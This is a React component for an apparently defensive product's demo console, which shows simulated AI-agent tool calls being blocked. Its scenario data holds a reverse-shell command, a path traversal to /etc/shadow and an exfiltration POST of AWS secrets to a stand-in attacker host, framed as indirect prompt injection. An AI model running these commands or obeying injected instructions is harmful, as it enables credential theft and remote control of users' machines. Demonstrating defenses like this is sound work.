'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';
import {
  ArrowRight,
  Check,
  Copy,
  FileCode2,
  GitBranch,
  Pause,
  Play,
  RadioTower,
  ShieldCheck,
  ShieldX,
} from 'lucide-react';

type Tab = 'live-intercept' | 'taint-graph' | 'policy';
type AttackScenario = 'path-traversal' | 'prompt-injection' | 'reverse-shell' | 'benign-allow';

interface ScenarioData {
  id: AttackScenario;
  title: string;
  label: string;
  tag?: string;
  category: string;
  client: string;
  tool: string;
  payload: string;
  rule: string;
  verdict: 'BLOCKED' | 'ALLOWED';
  latency: string;
  bytes: number;
  explanation: string;
}

const SCENARIOS: Record<AttackScenario, ScenarioData> = {
  'path-traversal': {
    id: 'path-traversal',
    title: 'Path Traversal Escape',
    label: 'Path traversal (../../.env)',
    category: 'CWE-22 / Sandbox Escape',
    client: 'Claude Desktop (MCP)',
    tool: 'filesystem.read_file',
    payload: '{"path": "../../../etc/shadow"}',
    rule: 'confinement.sandbox_root_boundary',
    verdict: 'BLOCKED',
    latency: '1.8 µs',
    bytes: 0,
    explanation: 'Lexical and canonical path traversal outside sandbox boundary prevented before syscall dispatch.',
  },
  'prompt-injection': {
    id: 'prompt-injection',
    title: 'Indirect Prompt Injection Exfiltration',
    label: 'Indirect prompt injection',
    tag: '#1 vector',
    category: 'OWASP ASI-01 / DIFC Violation',
    client: 'Cursor Agent (MCP)',
    tool: 'network.http_post',
    payload: '{"url": "https://attacker-c2.net/exfil", "data": "env.AWS_SECRET"}',
    rule: 'difc.taint.untrusted_egress_sink',
    verdict: 'BLOCKED',
    latency: '2.4 µs',
    bytes: 0,
    explanation: 'Untrusted taint tag propagated from web context prohibited from accessing egress socket sink.',
  },
  'reverse-shell': {
    id: 'reverse-shell',
    title: 'Interactive Reverse Shell Spawn',
    label: 'Reverse shell spawn',
    category: 'CWE-78 / Subprocess Injection',
    client: 'Windsurf Agent',
    tool: 'terminal.spawn_process',
    payload: '{"cmd": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}',
    rule: 'runtime.prohibit_interactive_subshell',
    verdict: 'BLOCKED',
    latency: '2.1 µs',
    bytes: 0,
    explanation: 'Execution attempt denied. Wire severed. 0 bytes written to kernel terminal descriptor.',
  },
  'benign-allow': {
    id: 'benign-allow',
    title: 'Authorized Workspace Inspection',
    label: 'Benign allowed tool',
    category: 'Permitted In-Scope Operation',
    client: 'LangChain MCP Agent',
    tool: 'filesystem.read_file',
    payload: '{"path": "src/components/Navigation.tsx"}',
    rule: 'policy.workspace.read_permitted',
    verdict: 'ALLOWED',
    latency: '1.9 µs',
    bytes: 412,
    explanation: 'Call verified against cryptographic capability token. Conforms strictly to declared policy.',
  },
};

const SCENARIO_ORDER: AttackScenario[] = ['prompt-injection', 'path-traversal', 'reverse-shell', 'benign-allow'];

const TABS: { id: Tab; label: string; icon: typeof RadioTower }[] = [
  { id: 'live-intercept', label: 'Intercept', icon: RadioTower },
  { id: 'taint-graph', label: 'DIFC taint graph', icon: GitBranch },
  { id: 'policy', label: 'Policy as code', icon: FileCode2 },
];

const POLICY_YAML = `# Mastyf Reference Monitor Security Policy
version: "2026.04"
perimeter: "production-agent-mesh"

invariants:
  - id: "difc_egress_confinement"
    description: "Tainted prompt tokens cannot reach network sinks"
    source_labels: ["untrusted_inbound", "indirect_prompt"]
    forbidden_sinks: ["network.http_*", "socket.connect"]
    action: "sever_wire"
    zero_bytes_guaranteed: true

  - id: "path_containment"
    description: "Prohibit directory escapes outside workspace"
    allowed_roots: ["/var/run/workspace/"]
    forbidden_patterns: ["../*", "/etc/*", "/root/*"]
    action: "terminate_tool_call"

  - id: "sub_microsecond_budget"
    max_evaluation_budget_us: 5.0
    fail_closed: true`;

const TAINT_STEPS = [
  {
    tone: 'warning',
    mark: '▲',
    stage: 'Untrusted ingestion',
    title: 'External prompt / web data',
    body: 'Raw input contains injected prompt tokens (e.g. hidden instructions inside untrusted markdown).',
    label: 'Taint: {T_UNTRUSTED}',
  },
  {
    tone: 'idle',
    mark: '○',
    stage: 'Agent cognition',
    title: 'LLM working memory',
    body: 'Model reasoning operates over tainted tokens. Mastyf assigns taint label to all downstream tool call intents.',
    label: 'Active label: {T_UNTRUSTED, S_RESTRICTED}',
  },
  {
    tone: 'critical',
    mark: '×',
    stage: 'Mastyf reference monitor',
    title: 'Fail-closed invariant check',
    body: 'Evaluates if Sink Clearance permits {T_UNTRUSTED}. Clearance fails: {T_UNTRUSTED} ⊄ S_CLEARANCE.',
    label: 'Verdict: wire severed (<2.1µs)',
  },
] as const;

const TAINT_EDGES = ['Taint propagates', 'Dispatch intent'];

function YamlLine({ line }: { line: string }) {
  if (line.trimStart().startsWith('#')) return <span className="tok-comment">{line}</span>;
  const match = line.match(/^(\s*-?\s*)([\w.]+)(:)(.*)$/);
  if (!match) return <>{line}</>;
  return (
    <>
      {match[1]}
      <span className="tok-key">{match[2]}</span>
      {match[3]}
      <span className="tok-value">{match[4]}</span>
    </>
  );
}

export function DecisionConsole() {
  const [activeTab, setActiveTab] = useState<Tab>('live-intercept');
  const [activeScenario, setActiveScenario] = useState<AttackScenario>('prompt-injection');
  const [isSparking, setIsSparking] = useState(false);
  const [autoTick, setAutoTick] = useState(true);
  const [copiedPolicy, setCopiedPolicy] = useState(false);

  const scenario = SCENARIOS[activeScenario];
  const blocked = scenario.verdict === 'BLOCKED';

  // Flash the gate when the scenario changes
  useEffect(() => {
    setIsSparking(true);
    const timer = setTimeout(() => setIsSparking(false), 900);
    return () => clearTimeout(timer);
  }, [activeScenario]);

  // Auto-cycle scenarios until the visitor picks one
  useEffect(() => {
    if (!autoTick) return;
    const interval = setInterval(() => {
      setActiveScenario((prev) => {
        if (prev === 'path-traversal') return 'prompt-injection';
        if (prev === 'prompt-injection') return 'reverse-shell';
        if (prev === 'reverse-shell') return 'benign-allow';
        return 'path-traversal';
      });
    }, 6000);
    return () => clearInterval(interval);
  }, [autoTick]);

  const handleSelectScenario = (sc: AttackScenario) => {
    setAutoTick(false);
    setActiveScenario(sc);
  };

  const copyPolicy = () => {
    navigator.clipboard?.writeText(POLICY_YAML);
    setCopiedPolicy(true);
    setTimeout(() => setCopiedPolicy(false), 2000);
  };

  return (
    <div className="console" data-reveal>
      <div className="console__head">
        <span className="console__id">
          <ShieldCheck size={14} strokeWidth={1.75} aria-hidden="true" />
          mastyf-kernel-appliance
          <span className="dim">v2026.4.1</span>
        </span>

        <div className="tablist console__tabs" role="tablist" aria-label="Console view">
          {TABS.map(({ id, label, icon: Icon }) => (
            <button
              key={id}
              type="button"
              role="tab"
              id={`console-tab-${id}`}
              aria-selected={activeTab === id}
              aria-controls={`console-panel-${id}`}
              className="tab"
              onClick={() => setActiveTab(id)}
            >
              <Icon size={13} strokeWidth={1.75} aria-hidden="true" />
              {label}
            </button>
          ))}
        </div>

        <span className="status status--active console__state">
          <span className="status__mark" aria-hidden="true">●</span>
          Enforcing <span className="unit">~1.5 ms</span>
        </span>
      </div>

      {activeTab === 'live-intercept' && (
        <div
          className="intercept"
          role="tabpanel"
          id="console-panel-live-intercept"
          aria-labelledby="console-tab-live-intercept"
        >
          <div className="intercept__list">
            <div className="console__bar">
              <span className="label">Simulate a tool call</span>
              <button
                type="button"
                className="icon-btn"
                onClick={() => setAutoTick((value) => !value)}
                aria-label={autoTick ? 'Pause auto-cycle' : 'Resume auto-cycle'}
                data-tip={autoTick ? 'Pause auto-cycle' : 'Resume auto-cycle'}
              >
                {autoTick ? (
                  <Pause size={14} strokeWidth={1.75} aria-hidden="true" />
                ) : (
                  <Play size={14} strokeWidth={1.75} aria-hidden="true" />
                )}
              </button>
            </div>
            <ul className="scenarios">
              {SCENARIO_ORDER.map((id) => {
                const item = SCENARIOS[id];
                const active = id === activeScenario;
                const itemBlocked = item.verdict === 'BLOCKED';
                return (
                  <li key={id}>
                    <button
                      type="button"
                      className={`scenario${active ? ' is-active' : ''}`}
                      aria-pressed={active}
                      onClick={() => handleSelectScenario(id)}
                    >
                      <span className={`scenario__mark ${itemBlocked ? 'tone-block' : 'tone-allow'}`} aria-hidden="true">
                        {itemBlocked ? '×' : '●'}
                      </span>
                      <span className="scenario__title">
                        {item.label}
                        {item.tag ? <span className="scenario__tag">{item.tag}</span> : null}
                      </span>
                      <span className="scenario__lat">{item.latency}</span>
                      <span className="scenario__tool">
                        {item.tool}
                        <span className="sr-only">, {itemBlocked ? 'blocked' : 'allowed'}</span>
                      </span>
                    </button>
                  </li>
                );
              })}
            </ul>
            <p className="intercept__hint">
              Simulated calls. {autoTick ? 'Cycling every 6s; pick one to hold it.' : 'Auto-cycle paused.'}
            </p>
          </div>

          <div className="intercept__detail" aria-live={autoTick ? 'off' : 'polite'}>
            <dl className="kv">
              <div>
                <dt>Client</dt>
                <dd>{scenario.client}</dd>
              </div>
              <div>
                <dt>Tool</dt>
                <dd>
                  <code>{scenario.tool}</code>
                </dd>
              </div>
              <div>
                <dt>Taint class</dt>
                <dd>{scenario.category}</dd>
              </div>
              <div>
                <dt>Invariant</dt>
                <dd>
                  <code>{scenario.rule}</code>
                </dd>
              </div>
            </dl>

            <pre className="intercept__payload">
              <code>{scenario.payload}</code>
            </pre>

            <div className={`path ${blocked ? 'path--block' : 'path--allow'}`} aria-hidden="true">
              <span className="path__node">Agent</span>
              <span className="path__seg">
                <span key={`in-${activeScenario}`} className="path__packet" />
              </span>
              <span className={`path__node path__node--gate${isSparking && blocked ? ' is-tripped' : ''}`}>
                {blocked ? (
                  <ShieldX size={13} strokeWidth={1.75} />
                ) : (
                  <ShieldCheck size={13} strokeWidth={1.75} />
                )}
                Mastyf
              </span>
              <span className="path__seg path__seg--out">
                {blocked ? null : <span key={`out-${activeScenario}`} className="path__packet path__packet--late" />}
              </span>
              <span className="path__node">Tools</span>
            </div>

            <div className={`verdict ${blocked ? 'verdict--block' : 'verdict--allow'}`}>
              <span className={`status ${blocked ? 'status--block' : 'status--allow'}`}>
                <span className="status__mark" aria-hidden="true">{blocked ? '×' : '●'}</span>
                {blocked ? 'Wire severed' : 'Capability verified'}
              </span>
              <span className="verdict__bytes">
                {blocked ? '0 bytes executed' : `Dispatched, ${scenario.bytes} bytes`}
              </span>
              <span className="verdict__lat">{scenario.latency}</span>
            </div>

            <p className="intercept__note">
              <span className="intercept__note-key">Kernel invariant</span>
              {scenario.explanation}
            </p>
          </div>
        </div>
      )}

      {activeTab === 'taint-graph' && (
        <div role="tabpanel" id="console-panel-taint-graph" aria-labelledby="console-tab-taint-graph">
          <div className="console__bar">
            <span className="label">Decentralized information flow control (DIFC) taint lattice</span>
            <span className="status status--active">
              <span className="status__mark" aria-hidden="true">●</span>
              Formalized
            </span>
          </div>
          <div className="flow">
            {TAINT_STEPS.map((step, index) => (
              <div key={step.stage} className="flow__cell">
                <div className="flow__step">
                  <span className={`status status--${step.tone}`}>
                    <span className="status__mark" aria-hidden="true">{step.mark}</span>
                    {step.stage}
                  </span>
                  <h4>{step.title}</h4>
                  <p>{step.body}</p>
                  <code className="flow__label">{step.label}</code>
                </div>
                {index < TAINT_EDGES.length ? (
                  <div className="flow__edge">
                    <ArrowRight size={14} strokeWidth={1.75} aria-hidden="true" />
                    <span>{TAINT_EDGES[index]}</span>
                  </div>
                ) : null}
              </div>
            ))}
          </div>
          <div className="console__foot">
            <span>
              Proves non-interference: information from untrusted sources cannot influence high-privilege sinks
              without explicit authorized declassification.
            </span>
            <Link href="/research" className="link-icon">
              Read the formal security proof
              <ArrowRight size={13} strokeWidth={1.75} aria-hidden="true" />
            </Link>
          </div>
        </div>
      )}

      {activeTab === 'policy' && (
        <div role="tabpanel" id="console-panel-policy" aria-labelledby="console-tab-policy">
          <div className="console__bar">
            <span className="console__file">
              <FileCode2 size={13} strokeWidth={1.75} aria-hidden="true" />
              mastyf-policy.yaml
              <span className="badge">Declarative</span>
            </span>
            <button type="button" onClick={copyPolicy} className="btn btn-sm">
              {copiedPolicy ? (
                <Check size={13} strokeWidth={2} aria-hidden="true" />
              ) : (
                <Copy size={13} strokeWidth={1.75} aria-hidden="true" />
              )}
              {copiedPolicy ? 'Copied' : 'Copy YAML'}
            </button>
          </div>
          <pre className="console__code" data-lenis-prevent>
            <code>
              {POLICY_YAML.split('\n').map((line, index) => (
                <span key={index} className="console__code-line">
                  <YamlLine line={line} />
                  {'\n'}
                </span>
              ))}
            </code>
          </pre>
          <div className="console__foot">
            <span>
              Every call is checked against your policy, in about 1.5 ms, before it reaches the tool.
            </span>
            <Link href="/developers" className="link-icon">
              Full policy SDK reference
              <ArrowRight size={13} strokeWidth={1.75} aria-hidden="true" />
            </Link>
          </div>
        </div>
      )}
    </div>
  );
}
